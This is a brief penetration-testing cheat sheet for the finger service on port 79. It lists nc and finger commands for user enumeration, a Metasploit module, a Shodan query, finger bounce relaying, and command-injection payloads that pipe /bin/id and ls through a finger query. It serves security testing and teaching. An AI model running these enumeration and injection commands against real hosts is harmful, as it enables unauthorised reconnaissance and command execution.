79 - Pentesting Finger
Basic Info

Finger is a program you can use to find information about computer users. It usually lists the login name, the full name, and possibly other details about the user you are fingering. These details may include the office location and phone number (if known), login time, idle time, time mail was last read, and the user's plan and project files.

Default port: 79

PORT   STATE SERVICE
79/tcp open  finger

Enumeration
Banner Grabbing/Basic connection

nc -vn <IP> 79
echo "root" | nc -vn <IP> 79

User enumeration

finger @<Victim>       #List users
finger admin@<Victim>  #Get info of user
finger user@<Victim>   #Get info of user

Alternatively you can use finger-user-enum from pentestmonkey, some examples:

finger-user-enum.pl -U users.txt -t 10.0.0.1
finger-user-enum.pl -u root -t 10.0.0.1
finger-user-enum.pl -U users.txt -T ips.txt

Nmap execute a script for doing using default scripts
Metasploit uses more tricks than Nmap

use auxiliary/scanner/finger/finger_users

Shodan

    port:79 USER

Command execution

finger "|/bin/id@example.com"
finger "|/bin/ls -a /@example.com"

Finger Bounce

​Use a system as a finger relay​

finger user@host@victim
finger @internal@external
